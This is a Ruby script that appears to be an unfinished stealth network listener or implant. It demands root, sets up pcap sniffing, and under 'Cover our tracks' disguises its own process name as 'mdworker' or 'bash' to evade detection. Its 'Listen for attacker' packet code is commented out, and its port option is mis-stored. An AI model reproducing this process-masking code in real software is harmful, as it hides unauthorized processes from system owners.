#!/usr/bin/env ruby

require 'optparse'
require 'rubygems'
require 'pcaplet'
require './dispatch.rb'
include Pcap

# ---------------------------------------------------------
# Setup and gather options
# ---------------------------------------------------------

# Make sure we're running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

# Parse options
options = {}

optparse = OptionParser.new do |opts|
	opts.on('-h', '--help', "Command Help") do
		puts opts
		exit
	end
	# The device to communicate on
	opts.on('-d', '--device DEVICE', "Network device to listen on. Default first network device installed on host.") do |f|
		options[:dev] = f
	end
	# Optionally sepcifiy the nameserver to query
	opts.on('-p', '--port PORT', "Port to listen on. Default 8000.") do |f|
		options[:nameserver] = f
	end
end

optparse.parse!

# Listening device
dev = options[:dev]? options[:dev] : Pcap.lookupdev
# Listening port
port = options[:port]? options[:port] : 8000

dispatcher = Dispatch.new

# ---------------------------------------------------------
# Cover our tracks
# ---------------------------------------------------------

# We'll choose a common process that is already running on the machine to mask this process with
# List in order of preference, as we'll choose the first one that is running on the machine. If none
# are found, the first process name will be used - list wisely.
covers = ['mdworker','bash']
top = `top -l 1`

# If none of the processes are found running, we'll just go with the first one
$0 = covers[0]

# Is there a process running that we can mask ourselves with? Choose the first one we find.
covers.each do |cover|
	if top.match cover
		# Change the process name
		$0 = cover
		break
	end
end

# ---------------------------------------------------------
# Listen for attacker
# ---------------------------------------------------------

# cap = Pcap::Capture.open_live(dev)
# cap.setfilter("udp")
# cap.loop do |pkt|
# 	print pkt, "\n"
# end
# cap.close

# ---------------------------------------------------------
# Listen for attacker
# ---------------------------------------------------------

# addr = Socket.pack_sockaddr_in(1024, destination_ip)
# 3.times do |i|
# 	ip = IP.new do |b|
# 		# ip_v and ip_hl are set for us by IP class
# 		b.ip_tos  = 0
# 		b.ip_id   = i + 1
# 		b.ip_off  = 0
# 		b.ip_ttl  = 64
# 		b.ip_p    = Socket::IPPROTO_RAW
# 		b.ip_src  = "127.0.0.1"
# 		b.ip_dst  = "127.0.0.1"
# 		b.body    = "just another IP hacker"
# 		b.ip_len  = b.length
# 		b.ip_sum  = 0 # linux will calculate this for us (QNX won't?)
# 	end

# 	out = "-"*80,
# 		"packet sent:",
# 		ip.inspect_detailed,
# 		"-"*80
# 	puts out
# 	$stdout.flush
# 	ssock.send(ip, 0, addr)
# 	sleep 1
# end

# ---------------------------------------------------------
# Fin
# ---------------------------------------------------------
